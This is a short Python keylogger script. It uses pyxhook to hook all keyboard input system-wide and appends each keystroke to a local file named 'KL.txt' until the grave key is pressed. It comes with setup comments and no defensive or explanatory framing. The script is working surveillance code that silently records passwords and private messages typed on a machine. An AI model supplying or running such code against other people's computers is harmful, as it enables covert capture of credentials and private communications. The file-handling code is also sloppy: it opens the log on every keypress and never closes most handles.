import pyxhook
from pynput.keyboard import Key, Controller

# ------------------pyxhook is downloaded and kept along with the file
# ---------------------if required use command----> pip3 install pynput
# ------------------Press ` (below ESC key) to terminate the program

log_file='KL.txt'

#this function is called everytime a key is pressed.
def KeyPress(event):
  f = open(log_file,'a')
  f.write(event.Key)
  f.write('\n')

  if event.Ascii==96:   #96 is the ascii value of the grave key (`)
    f.close()
    new_hook.cancel()
    
##MAIN

new_hook=pyxhook.HookManager()

new_hook.KeyDown=KeyPress

new_hook.HookKeyboard()

new_hook.start()

